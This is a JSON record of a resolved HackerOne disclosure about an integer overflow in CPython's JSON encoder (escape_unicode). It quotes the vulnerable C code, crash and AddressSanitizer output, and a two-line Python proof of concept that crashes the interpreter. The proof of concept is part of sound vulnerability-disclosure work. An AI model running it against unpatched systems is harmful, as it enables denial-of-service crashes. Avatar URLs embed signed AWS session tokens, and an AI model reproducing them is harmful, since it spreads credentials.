{
  "id": 73260,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI2MA==",
  "url": "https://hackerone.com/reports/73260",
  "title": "Integer overflow in _json_encode_unicode leads to crash",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-06-27T00:00:00.000Z",
  "submitted_at": "2015-06-27T00:00:00.000Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nilch",
    "url": "/nilch",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWO64PMDV%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212747Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEKScgMlMGAVeNGajlMSn18e4rl7sGTIRr6stK%2FbXgkFAiEAx3WWgg%2B0ZZiONdeQZINxuiA7YSOy0xO3BE4P7QALvnkqsgUINBADGgwwMTM2MTkyNzQ4NDkiDH7ozUXHAoYJqvTYjSqPBTEfYD%2FQ%2BU8kSDSmrEdv9R0EeypNA7wJnHzS12JAQvpoYsbAXSkI4kFenP4%2FGJvpv1HXueOwiP8nz8rIHRLDZ9LvKnBu0x6Za3%2Fx52kjAdr6wmJ%2FoHvc2NBvZF7HMYAf%2BMMJhzj0rMcGq8Xb%2BZ%2FL9MoNyZsjkiI1wlv2u1VOznP0iYn6zVWKaFwm8piszEQM8BDtwaF752dO2w6BoxwvOSqYn58fxTzlRZ3UvNs07fEGOOMdNWE3dFosiReiAiONYpvecye1XwlnvNV5iuvO99%2F7sZyayxaYp%2Fa9UtrrTRLWkBThSuZVdobuJAMLh3wFiuQ%2BkJV%2F%2FBd3K38Bx1Sac5D48wIgXwEjdcC54Wt6Gcr7B52mSzOQr3CxYCNKifFWDJZqyHlhPNYkNT33uC%2FhBlJwnG1%2BvpfNEKUVpdR7jmIwITPq%2BmuTCWsqO3yFZF9NlS1JaFRzmtYswhGSbRidh9mjod22cFJkBwTkd%2Byr%2Bxm5zbE3DQwMZqRhgLwkzQ0zFnPhpY%2BYasYKLzscptn6jCLhS%2F%2BMCb9aD35t6AnbCHaZfAPh8XUCUQ7CzxGcTV3tbyPFwpL%2FPRYRc3LKtfGeQxTE95ymcgedguQW07fxoB7TA9B%2BoP7u6x%2BD3w%2FANNZsaFv7X3G4xf1BkbFgs9r3FSbk%2F87gbO4xdE%2FHefjYdKtzBnPm3%2FYRLGCBQgPPEvFabe7zHh2YvEWF5kdBLVJnxZa%2FV1Ji%2BN%2B8HqGehnfl516tJmgGKZfmCPgToCFp5ucj5HTnD6oVHqi8NGQZD8kV%2FfiC5Mcc%2FGyqLvy5AuiWj%2F9gZ74PRqAU14ZzxaXGrPbGByX10fVZjtMMtLuRjAh5rB07b37W8F%2By83c8X1IRSYYwm7nGxgY6sQFIsXlL3bTJTB%2FL2gZtDY%2BBWIbBlM7Y%2Btwwu4qnpEw7%2B1%2FVC8nbGvHanRjvnEoWSzzA%2F%2FXflTCjcN8yuxD7N099YWv4S9UL257fVLGS8crwEnDdp3%2BJuO55noA22trsUqfZUplmkhnDTTPMo9bxfgNNvwZ3zIwJPT4BNp5YDDTPZT4FzT%2BJEwuf3qTAiyHfwpPr4Vb0%2B0tNkMAHzIcts9G8ri%2FMW5xEKvZiDtT2JPgt%2Fs0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=960b29113d583a63455f704c9ddcb29884adc97aa1f4b5946b13183c33934ce0",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWO64PMDV%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212747Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEKScgMlMGAVeNGajlMSn18e4rl7sGTIRr6stK%2FbXgkFAiEAx3WWgg%2B0ZZiONdeQZINxuiA7YSOy0xO3BE4P7QALvnkqsgUINBADGgwwMTM2MTkyNzQ4NDkiDH7ozUXHAoYJqvTYjSqPBTEfYD%2FQ%2BU8kSDSmrEdv9R0EeypNA7wJnHzS12JAQvpoYsbAXSkI4kFenP4%2FGJvpv1HXueOwiP8nz8rIHRLDZ9LvKnBu0x6Za3%2Fx52kjAdr6wmJ%2FoHvc2NBvZF7HMYAf%2BMMJhzj0rMcGq8Xb%2BZ%2FL9MoNyZsjkiI1wlv2u1VOznP0iYn6zVWKaFwm8piszEQM8BDtwaF752dO2w6BoxwvOSqYn58fxTzlRZ3UvNs07fEGOOMdNWE3dFosiReiAiONYpvecye1XwlnvNV5iuvO99%2F7sZyayxaYp%2Fa9UtrrTRLWkBThSuZVdobuJAMLh3wFiuQ%2BkJV%2F%2FBd3K38Bx1Sac5D48wIgXwEjdcC54Wt6Gcr7B52mSzOQr3CxYCNKifFWDJZqyHlhPNYkNT33uC%2FhBlJwnG1%2BvpfNEKUVpdR7jmIwITPq%2BmuTCWsqO3yFZF9NlS1JaFRzmtYswhGSbRidh9mjod22cFJkBwTkd%2Byr%2Bxm5zbE3DQwMZqRhgLwkzQ0zFnPhpY%2BYasYKLzscptn6jCLhS%2F%2BMCb9aD35t6AnbCHaZfAPh8XUCUQ7CzxGcTV3tbyPFwpL%2FPRYRc3LKtfGeQxTE95ymcgedguQW07fxoB7TA9B%2BoP7u6x%2BD3w%2FANNZsaFv7X3G4xf1BkbFgs9r3FSbk%2F87gbO4xdE%2FHefjYdKtzBnPm3%2FYRLGCBQgPPEvFabe7zHh2YvEWF5kdBLVJnxZa%2FV1Ji%2BN%2B8HqGehnfl516tJmgGKZfmCPgToCFp5ucj5HTnD6oVHqi8NGQZD8kV%2FfiC5Mcc%2FGyqLvy5AuiWj%2F9gZ74PRqAU14ZzxaXGrPbGByX10fVZjtMMtLuRjAh5rB07b37W8F%2By83c8X1IRSYYwm7nGxgY6sQFIsXlL3bTJTB%2FL2gZtDY%2BBWIbBlM7Y%2Btwwu4qnpEw7%2B1%2FVC8nbGvHanRjvnEoWSzzA%2F%2FXflTCjcN8yuxD7N099YWv4S9UL257fVLGS8crwEnDdp3%2BJuO55noA22trsUqfZUplmkhnDTTPMo9bxfgNNvwZ3zIwJPT4BNp5YDDTPZT4FzT%2BJEwuf3qTAiyHfwpPr4Vb0%2B0tNkMAHzIcts9G8ri%2FMW5xEKvZiDtT2JPgt%2Fs0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f9859c2f4b947109b09feb6d28d21d4d7a741592aceced55aa3893af24720176"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2015-06-27T00:00:00.000Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2015-06-27T00:00:00.000Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "http://bugs.python.org/issue24522\n\n```\n# static PyObject *\n# escape_unicode(PyObject *pystr)\n# {\n#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */\n#     Py_ssize_t i;\n#     Py_ssize_t input_chars;\n#     Py_ssize_t output_size;\n#     Py_ssize_t chars;\n#     PyObject *rval;\n#     void *input;\n#     int kind;\n#     Py_UCS4 maxchar;\n# \n#     if (PyUnicode_READY(pystr) == -1)\n#         return NULL;\n# \n#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);\n#     input_chars = PyUnicode_GET_LENGTH(pystr);\n#     input = PyUnicode_DATA(pystr);\n#     kind = PyUnicode_KIND(pystr);\n# \n#     /* Compute the output size */\n#     for (i = 0, output_size = 2; i < input_chars; i++) {\n#         Py_UCS4 c = PyUnicode_READ(kind, input, i);\n#         switch (c) {\n#         case '\\\\': case '\"': case '\\b': case '\\f':\n#         case '\\n': case '\\r': case '\\t':\n#             output_size += 2;\n#             break;\n#         default:\n#             if (c <= 0x1f)\n#                 output_size += 6;\n#             else\n#                 output_size++;\n#         }\n#     }\n#\n#     rval = PyUnicode_New(output_size, maxchar);\n#\n# 1.) if c is <= 0x1f then output_size += 6. There are no overflow checks on this variable.\n# 2.) rval buffer is too small to hold results\n#\n# Crash:\n# ------\n#\n# Program received signal SIGSEGV, Segmentation fault.\n# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)\n#     at /home/pail/cpython/Modules/_json.c:306\n# 306                ENCODE_OUTPUT;\n#\n# OS info\n# --------\n#  %./python -V\n#  > Python 3.6.0a0\n# % uname -a\n# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux\n#\n# ASAN Info (details in other file)\n# =================================================================\n# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac\n# WRITE of size 1 at 0xb5c00000 thread T0\n```\n\nimport json\n\nsp = \"\\x13\"*715827883 #((2**32)/6 + 1)\njson.dumps([sp], ensure_ascii=False)\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "shivammusic"
  ],
  "structured_scope": {
    "databaseId": 84536,
    "asset_type": "OTHER",
    "asset_identifier": "Python (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
